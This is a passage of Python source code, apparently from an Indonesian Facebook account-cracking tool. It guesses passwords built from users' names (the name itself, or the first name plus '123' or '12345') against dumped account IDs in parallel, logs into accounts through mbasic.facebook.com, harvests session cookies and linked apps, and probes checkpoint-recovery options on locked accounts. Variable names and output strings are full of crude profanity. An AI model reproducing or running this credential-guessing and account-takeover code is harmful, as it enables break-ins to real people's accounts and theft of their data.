            jalan('\n [•] anda bisa mematikan data selular untuk menjeda proses crack\n');time.sleep(0.2)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print('\n [•] input yang bener');self.__pler__()


def option_sesi():
	files = ("checkcp.txt")
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit(" [•] Files Tidak Ada!"%(files))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [•] Check Account : "+(kontol.replace(" + ","")))
		try:
			dekura_chann(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('checkcp.txt')
	exit("\n [•] Done Ya Anjing")

def dekura_chann(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	# kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [•] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" [•] Total Opsi Yang Tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [•] %s"%(oh))
	else:
		print(" [•] Eror Login Failed!\n")


def menuutama():
    os.system('clear')
    print logo
    print ('\n [1] Dump ID Dari Teman (login)')
    print (' [2] Dump ID Dari Publik (login)')
    print (' [3] Dump ID Dari Follower (login)')
    print (' [4] Dump ID Dari Like (login)')
    print (' [5] Dump ID Dari Grub (login)')
    print (' [6] Crack With Files (no login)')
    print (' [7] Check Opsi checkpoint (no login)')
    print (' [8] Setting User Agent (no login)')
    print (' [9] Check Result Crack Facebook (no login)')
    print (' [0] Exit\n')
    pilihmenuutama()

def pilihmenuutama():
  mn = raw_input(" [•] Input : ")
  if mn == "":
	print (' [•] Isi Dengan Benar')
	menu()
  elif mn == "1" or mn == '01':
    logs()
  elif mn =="2" or mn == '02':
    logs()
  elif mn == "3" or mn == '03':
    logs()
  elif mn == "4" or mn == '04':
    logs()
  elif mn == "5" or mn == '05':
    login()
  elif mn =="6" or mn == '06':
    __crack__().plerr()
  elif mn =="7" or mn == '07':
    syngara()
  elif mn =="8" or mn == '08':
    setua()
  elif mn =="9" or mn == '09':
      resultcrack()
  elif mn == "0" or mn == '00':
    os.sys.exit()
  else:
    print (' [•] Isi Dengan Benar')
    pilihmenuutama()

def logs():
    os.system('clear')
    print logo
    print '\n [1] Login With Token Facebook  '
    print ' [2] Login With Cookie Facebook '
    print ' [0] Exite Programs'
    sek = raw_input('\n [•] Pilih: ')
    if sek=="":
        print(" [•]Keyword Salah");logs()
    elif sek=="1":
        log_token()
    elif sek=="2":
        login()
    elif sek=="0":
        exit()
    else:
        print(" [•] Keyword Salah");logs()

def syngara():
	print("\n [•] Masukan File cp.txt")
	files = raw_input(" [•] File: ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit(" [•] Files %s Tidak Ada!"%(files))
	print(" [•] Total Account Cp : \033[1;32m%s\033[1;37m"%(len(buka_baju)))
	print(" [•] Check Opsi Checkpoint, Please Wait...")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [•] Account : "+(kontol.replace(" + ","")))
		try:
			aracans(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n [•] Cek Account Checkpoint Selesai...")
	raw_input(" Back")
	menu()
def aracans(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	# kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [•] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" [•] Total Opsi Yang Tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [•]  %s"%(oh))
	else:
		print(" [•] Login Gagal, ID/Pass Salah\n")


def resultcrack():
    os.system('clear')
    print logo 
    print(50*"-")
    print((" [•] Result Cracker Facebook [•]"))
    print(50*"-")
    print((" [•] Result OK "))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((" [•] No Result Found"))
    print(("\n [•] Result CP"))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((" [•] No Result Found"))
    n=raw_input("\033[1;37m [BACK]")
    menu()

if __name__=='__main__':
    os.system('git pull')
    os.system('rm -rf checkcp.txt')
    menu()
